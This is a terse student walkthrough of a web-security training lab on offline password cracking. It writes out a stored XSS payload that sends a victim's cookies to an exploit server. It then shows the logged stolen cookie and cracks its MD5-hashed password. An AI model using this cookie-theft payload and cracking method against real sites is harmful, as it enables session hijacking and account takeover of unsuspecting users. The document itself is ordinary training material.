Lab: Offline password cracking
This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos
analysis;
- hash of password -> stor it in a cookie
-  Xss vulnerability in the comment .
- obtain carols -> stay loggeed in cookie -> use it to crack his password
- log in as carlos+delete his account ->from My account page.


  - go to login page of wiener -> see the url of exploit server
  - copy it
   logout as wiener
go to home page 
go to any item and start post on 
go to comment write this xss vlunerability to crack the user cookie  stay logged in 
<script>document.location='write here your  url of exploit server'+document.cookie</script>
then after adding the post
check
the access logs of exploit server 
you will find like this;
```

10.0.4.28       2026-05-30 09:50:04 +0000 "GET /exploitsecret=UrqEfw37VW46XYo8ZChMLTvAyflQOguH;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

```
analyse stay logged in cookie in decoder of burp
take md5 hash of password ; analyse it on crackstation.net
you will find the result is  the password of him
```
carlos:26323c16d5f4dabff3bb136f2460a943
pass; onceuponatime
```
log with the carlos+password
delete password
here we go done.
